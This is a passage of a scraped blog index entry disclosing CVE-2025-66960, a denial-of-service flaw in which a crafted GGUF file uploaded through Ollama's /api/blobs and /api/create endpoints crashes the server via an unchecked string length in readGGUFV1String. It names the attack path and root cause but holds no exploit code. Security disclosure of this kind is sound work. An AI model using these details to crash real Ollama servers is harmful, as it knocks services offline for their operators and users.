https://github.com/ollama/ollama/issues/9820? \u0026gt; \u0026gt; ------------------------------------------ \u0026gt; \u0026gt; [Discoverer] \u0026gt; kimh \u0026gt; \u0026gt; Use CVE-2025-66960. ","permalink":"https://zero.shotlearni.ng/blog/cve-2025-66960guf-v1-string-length-cause-panic-in-readggufv1string/","summary":"Severity Score : 7.5 / 10\nCVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\nSummary A remote unauthenticated Denial-of-Service exists in Ollama’s GGUF decoder.\nWhen a crafted GGUF file is uploaded and used during model creation, the server panics and terminates.\nKey signature\npanic: bytes.Buffer: truncation out of range stack: readGGUFV1String → readGGUFString → (*gguf).Decode → server.(*Server).Create… This affects the REST path /api/blobs (upload) + /api/create (files map) and brings down the process.\nDetails(root cause) In fs/ggml/gguf.go, function readGGUFV1String reads a string length from untrusted GGUF metadata and later ends up calling bytes.","title":"[CVE-2025-66960]GUF v1 string length cause panic in readGGUFV1String"}]